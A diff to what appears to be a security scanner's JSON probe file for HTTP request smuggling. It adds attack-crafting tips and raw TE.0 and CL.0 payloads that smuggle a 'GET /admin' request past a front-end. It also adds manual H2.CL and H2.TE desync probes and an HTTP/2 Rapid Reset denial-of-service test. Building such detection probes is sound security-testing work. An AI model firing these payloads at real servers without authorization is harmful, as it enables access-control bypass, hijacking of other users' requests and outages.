@@ -1,5 +1,17 @@
 {
   "category": "request_smuggling",
+  "craft_guidance": [
+    "1. CLASSIC: CL.TE / TE.CL / TE.TE on HTTP/1.1 between front-end (CDN/LB) and origin.",
+    "2. 2024 CLASSES (Smashing the State Machine, J. Kettle): TE.0 (back-end ignores chunked, expects 0-byte body); CL.0 (server reads 0 bytes regardless of CL); H2.CL / H2.TE (HTTP/2 frame plus HTTP/1 header confuses h2c proxies); 0.CL (client uses CL but TLS terminator strips it).",
+    "3. H2->H1 DOWNGRADE: cleartext h2c (HTTP/2 cleartext) terminating to HTTP/1.1 origin is the 2024 hot zone. Inject `Content-Length: 0` in HTTP/2 :method = POST + body; some h2c proxies pass body to origin which sees 0-byte body and reads next request.",
+    "4. CONNECTION-KEEP-ALIVE: send `Connection: close` on outer; some HTTP/2 stacks keep connection open and reuse for the next request, smuggling the previous body.",
+    "5. EARLY-RESPONSE: trigger 4xx on the first request; if connection stays open, smuggled tail becomes start of next victim request.",
+    "6. PIPELINING: send two requests rapidly; if second response is delayed beyond timeout, pipelining is enabled and smuggling viable.",
+    "7. DETECT WITHOUT BREAKING THE TARGET: timing-based (5s+ delay) > 4xx > smuggled body delivered. Don't poison shared cache without explicit authorization (R5 destructive concern).",
+    "8. RESPONSE-SPLITTING via SMUGGLING: smuggled request gets victim's response. Use carefully; document scope authorization.",
+    "9. WS UPGRADE PIVOT: smuggle a WebSocket Upgrade request; if origin upgrades, attacker controls a hijacked WS to victim.",
+    "10. HTTP/2 RAPID RESET (CVE-2023-44487): not strictly smuggling but related — opening many streams with immediate RST_STREAM is a DoS class on most h2 stacks."
+  ],
   "contexts": {
     "cl_te": {
       "description": "CL.TE request smuggling — front-end uses Content-Length, back-end uses Transfer-Encoding",
@@ -69,6 +81,94 @@
           ],
           "severity": "high",
           "confidence_boost": 45
+        }
+      ]
+    },
+    "te_zero": {
+      "description": "TE.0 — front-end uses Transfer-Encoding chunked, back-end ignores TE entirely and treats body as 0 bytes (because no Content-Length). Body bytes become the start of the NEXT request (Smashing the State Machine 2024 class).",
+      "tech_match": ["Apache", "Nginx", "IIS", "h2c"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nTransfer-Encoding: chunked\r\n\r\n26\r\nGET /admin HTTP/1.1\r\nHost: {{host}}\r\n\r\n0\r\n\r\n",
+          "description": "TE.0 — front-end uses chunked, back-end has no CL fallback and reads 0 bytes; smuggled GET /admin becomes the next request.",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 401, 403]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "cl_zero": {
+      "description": "CL.0 — back-end ignores Content-Length and reads 0 bytes (e.g. some HTTP/2 origins terminating from h2c). Body becomes start of next request (Smashing the State Machine 2024 class).",
+      "tech_match": ["h2c", "Envoy", "HAProxy"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: {{host}}\r\nContent-Length: 26\r\n\r\nGET /admin HTTP/1.1\r\nHost: {{host}}\r\n\r\n",
+          "description": "CL.0 — front-end forwards 26 bytes, back-end reads 0 (CL ignored); smuggled GET /admin becomes the next request seen by origin.",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 401, 403]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "h2_cl": {
+      "description": "H2.CL — HTTP/2 request with Content-Length header (spec says CL is informational on H2). Some h2c->h1 downgrading proxies trust the CL while origin uses the framed length, causing desync. Heavy 2024 research vector.",
+      "tech_match": ["h2c", "h2", "Envoy", "Apache", "Nginx"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] Send HTTP/2 POST with Content-Length: 0 but actual body data. h2c proxy pads to 0; origin sees framed body. Smuggling primitive established. Use a manual h2 client (e.g. h2c.py).",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 500]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"manual_only": true}
+        }
+      ]
+    },
+    "h2_te": {
+      "description": "H2.TE — HTTP/2 request carrying Transfer-Encoding header (forbidden in H2). Some h2c origins still parse TE on the H1 side after downgrade.",
+      "tech_match": ["h2c", "h2", "Envoy", "Apache"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] HTTP/2 request with Transfer-Encoding: chunked + framed body. Origin downgrades to HTTP/1.1 and chunks the framed body, treating leftover as next request.",
+          "matchers": [
+            {"type": "timing", "min_ms": 5000},
+            {"type": "status", "status": [400, 500]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"manual_only": true}
+        }
+      ]
+    },
+    "h2_rapid_reset": {
+      "description": "CVE-2023-44487 HTTP/2 Rapid Reset — open N streams + immediate RST_STREAM. Most h2 stacks process headers before honoring reset, causing CPU/memory exhaustion. Distinct from request smuggling but classed adjacent.",
+      "tech_match": ["h2", "Nginx", "Envoy", "Apache"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "[Manual] Open 100+ HTTP/2 streams + RST_STREAM each. Connection-level CPU spike or 502 cluster-wide indicates Rapid Reset DoS. Authorize before testing — DoS class.",
+          "matchers": [
+            {"type": "status", "status": [502, 503, 504]},
+            {"type": "timing", "min_ms": 10000}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"manual_only": true, "dos_class": true}
         }
       ]
     }
